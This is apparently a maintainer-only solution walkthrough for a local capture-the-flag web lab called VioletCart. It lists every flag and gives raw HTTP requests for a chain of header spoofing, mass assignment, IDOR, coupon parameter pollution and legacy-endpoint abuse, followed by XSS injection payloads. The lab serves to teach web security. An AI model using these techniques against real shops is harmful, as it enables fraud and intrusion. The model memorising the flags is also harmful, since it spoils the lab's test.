# Maintainer Walkthrough - Lab 6 VioletCart

This file is maintainer-only. Do not publish the real walkthrough to the public main branch.

## Flags

```text
FLAG{violet_recon_requires_patience}
FLAG{legacy_context_changes_everything}
FLAG{seller_flow_was_never_public}
FLAG{impossible_is_just_context_reused_correctly}
```

## Intended main chain

```text
recon -> quote -> reservation -> partner context -> legacy sync -> seller reservation -> seller approval -> staff coupon -> partner settlement
```

Use a browser and Burp Repeater. The raw examples below are representative; cookie values will differ.

## 1. Initial browsing

Login with:

```text
guest / guest123
```

Browse:

- `/`
- `/cars.php`
- `/car.php?id=1`
- `/finance.php`
- `/checkout.php`
- `/support.php`
- `/documents.php`

Important observations:

- Headers include `X-Violet-Flow: public_checkout`.
- `X-Violet-Legacy: disabled` appears on public pages.
- Support tickets mention `partner_checkout`, staff coupon mismatch, seller sync, and internal reservation formats.
- `checkout-violet.js` defines `legacySyncPath = "/legacy/quote-sync.php"`.

## 2. Flag 1 - deep recon

Open documents and inspect the public financing/import memos. `VC-2026-0007` hints at quote token and internal reservation formats. The required recon checkpoint is in the tracked public document `VC-2026-0017`.

Normal download:

```http
GET /download.php?file=public_docs/VC-2026-0007.txt HTTP/1.1
Host: localhost:8098
Cookie: PHPSESSID=...
```

Download the tracked recon memo:

```http
GET /download.php?file=public_docs/VC-2026-0017.txt HTTP/1.1
Host: localhost:8098
Cookie: PHPSESSID=...
```

The memo does not contain the flag directly. It contains the values needed to confirm the recon checkpoint:

```text
checkpoint: violet-recon-patience
trace: quote-migration-2026-02
migration marker: query registry may confirm completed recon checkpoints
```

Submit those values to the query registry:

```http
POST /api/query.php HTTP/1.1
Host: localhost:8098
Content-Type: application/json
Cookie: PHPSESSID=...

{"query":"reconCheckpoint","checkpoint":"violet-recon-patience","trace":"quote-migration-2026-02"}
```

The response returns:

```text
FLAG{violet_recon_requires_patience}
```

This also confirms that `partner_checkout` requires quote and reservation state before sync. The flag is obtained through interaction, not by grepping the repository. The ignored `app/storage/logs/` directory may contain local runtime logs, but it is not required for the intended solution.

## 3. Create a quote

Use the finance UI or Repeater:

```http
POST /api/create_quote.php HTTP/1.1
Host: localhost:8098
Content-Type: application/json
Cookie: PHPSESSID=...

{"car_id":5,"term_months":60,"down_payment":25000}
```

Expected response contains:

```json
{
  "quote_id": 1,
  "public_token": "vc_quote_701",
  "flow": "public_checkout"
}
```

Record `quote_id`, `public_token`, and `car_id`.

## 4. Create a reservation

Normal UI request:

```http
POST /api/create_reservation.php HTTP/1.1
Host: localhost:8098
Content-Type: application/json
Cookie: PHPSESSID=...

{"quote_id":1,"public_token":"vc_quote_701"}
```

Expected response contains `reservation_id`.

Mass assignment clue:

```http
POST /api/create_reservation.php HTTP/1.1
Host: localhost:8098
Content-Type: application/json
Cookie: PHPSESSID=...

{"quote_id":1,"public_token":"vc_quote_701","channel":"partner_checkout","requested_status":"seller_review","partner_hint":"seller-assisted"}
```

This can influence partial state and headers, but does not directly solve the lab. It is a clue about state confusion.

## 5. Contextual IDOR and cross-object trust

Check reservation status:

```http
GET /api/reservation_status.php?quote_id=1&reservation_id=1&public_token=vc_quote_701 HTTP/1.1
Host: localhost:8098
Cookie: PHPSESSID=...
```

The endpoint appears to validate context, but it trusts quote context too broadly. It does not fall to random `id=1`; it needs a valid quote/reservation/token combination from the flow.

After legacy sync, the same endpoint leaks `internal_reservation_hint` and `seller_ref_hint`.

## 6. Legacy endpoint too early

Try the legacy endpoint without context:

```http
POST /legacy/quote-sync.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=...

quote_id=1&reservation_id=1&public_token=vc_quote_701
```

Expected:

```json
{"error":"missing_channel"}
```

Try a public channel:

```http
POST /legacy/quote-sync.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
X-Violet-Channel: public_checkout
Cookie: PHPSESSID=...

quote_id=1&reservation_id=1&public_token=vc_quote_701
```

Expected:

```json
{"error":"unsupported_public_flow"}
```

This shows that the header matters, but does not magically unlock everything.

## 7. Flag 2 - legacy context

Send the correct context:

```http
POST /legacy/quote-sync.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
X-Violet-Channel: partner_checkout
Cookie: PHPSESSID=...

quote_id=1&reservation_id=1&public_token=vc_quote_701
```

Expected response:

```json
{
  "synced": true,
  "seller_ref": "SEL-VIOLET-421",
  "internal_reservation": "R-1042-V",
  "seller_status": "pending",
  "flag": "FLAG{legacy_context_changes_everything}"
}
```

Record `internal_reservation`.

## 8. Seller reservation forbidden without channel

Normal request:

```http
GET /seller/reservation.php?ref=R-1042-V HTTP/1.1
Host: localhost:8098
Cookie: PHPSESSID=...
```

Expected: HTTP 403 with a message saying the seller reservation exists but the request is not partner checkout.

## 9. Flag 3 - seller flow

Repeat with partner header:

```http
GET /seller/reservation.php?ref=R-1042-V HTTP/1.1
Host: localhost:8098
X-Violet-Channel: partner_checkout
Cookie: PHPSESSID=...
```

The seller reservation page renders and contains:

```text
FLAG{seller_flow_was_never_public}
```

## 10. Seller approval

Approve review through Repeater:

```http
POST /seller/review.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
X-Violet-Channel: partner_checkout
Cookie: PHPSESSID=...

internal_reservation=R-1042-V&decision=approve
```

Expected:

```json
{"reviewed":true,"seller_status":"approved"}
```

## 11. Coupon bypass and parameter pollution

`WELCOME10` works publicly but is not useful for the final chain.

`PURPLE-STAFF` fails in public checkout:

```http
POST /api/apply_coupon.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=...

quote_id=1&reservation_id=1&coupon=PURPLE-STAFF
```

Expected: `coupon_channel_mismatch` or seller approval related errors depending on state.

After seller approval, use partner context. Parameter pollution demonstrates parser inconsistency:

```http
POST /api/apply_coupon.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
X-Violet-Channel: partner_checkout
Cookie: PHPSESSID=...

quote_id=1&reservation_id=1&coupon=WELCOME10&coupon=PURPLE-STAFF
```

Frontend-style validation sees the first coupon. Backend applies the last one.

Expected:

```json
{
  "applied": true,
  "frontend_seen": "WELCOME10",
  "backend_applied": "PURPLE-STAFF"
}
```

## 12. Flag 4 - final order

Confirm order:

```http
POST /api/confirm_order.php HTTP/1.1
Host: localhost:8098
Content-Type: application/x-www-form-urlencoded
X-Violet-Channel: partner_checkout
Cookie: PHPSESSID=...

quote_id=1&reservation_id=1&payment_method=partner_settlement
```

Expected:

```json
{
  "confirmed": true,
  "payment_method": "partner_settlement",
  "flag": "FLAG{impossible_is_just_context_reused_correctly}"
}
```

## Rabbit holes

- `/admin.php` shows a clearly labeled QA placeholder and is not the solution.
- Basic SQL injection strings in `cars.php?sort=` are blocked.
- `WELCOME10` is valid but not useful for seller settlement.
- `/legacy/quote-sync.php` looks useless before quote/reservation/channel context exists.
- `/seller/reservation.php` is forbidden until the correct internal reservation and channel exist.
- Common XSS payloads are heavily filtered.
- Inspection aliases reveal state hints but do not approve checkout.

## Vulnerability map

1. Contextual IDOR: `api/reservation_status.php` trusts valid quote context and leaks richer reservation state after sync.
2. Cross-object IDOR: quote, reservation, car, seller ref, and internal reservation are paired inconsistently.
3. Broken access control: `seller/reservation.php` relies on `X-Violet-Channel` plus internal reference.
4. Business logic flaw: final order can follow legacy/seller/coupon state instead of public UI order.
5. Coupon bypass: `PURPLE-STAFF` works only after partner/seller state.
6. Legacy abuse: `legacy/quote-sync.php` creates seller context from migrated quote state.
7. Header confusion: `X-Violet-Channel: partner_checkout` changes selected endpoint behavior.
8. Cache/state confusion: quote/reservation channel state is reused after sync and hold.
9. Token confusion: `public_token` is trusted as stronger proof than it should be.
10. Info disclosure: headers, JS constants, tickets, public docs, and response differences expose partial clues.
11. Reflected XSS: `search.php?q=` filters common payloads but reflects into JS string context.
12. Stored XSS: `reviews.php` filters body and attributes differently; title/display fields can break attribute context.
13. HTTP parameter pollution: `apply_coupon.php` parses first vs last `coupon` differently.
14. Mass assignment: `create_reservation.php` accepts extra fields like `channel`, `requested_status`, and `partner_hint`.
15. Predictable documents: `documents.php?doc=VC-2026-0007` reveals financing memo patterns.
16. Limited download/path behavior: `download.php` exposes approved public document mirrors and helps confirm document-based recon.
17. SQL-like ordering bug: `cars.php?sort=` blocks obvious SQLi but accepts hidden sort keys.
18. Controlled SSRF-like behavior: `api/vehicle_inspection.php` resolves only safe Violet aliases.
19. Weak open redirect: `redirect.php?next=` allows broad relative redirects.
20. Query enumeration: `api/query.php` blocks obvious names but exposes policy hints through less obvious queries.

## XSS proof examples

Reflected JS-string proof:

```text
/search.php?q=';window.violetProof=1;violetSearchNotice('proof');//
```

Stored attribute-context proof in review title or display name:

```text
" autofocus onfocus="violetReviewProof('stored')
```

These are harmless local proofs. They are not part of the final flag chain.
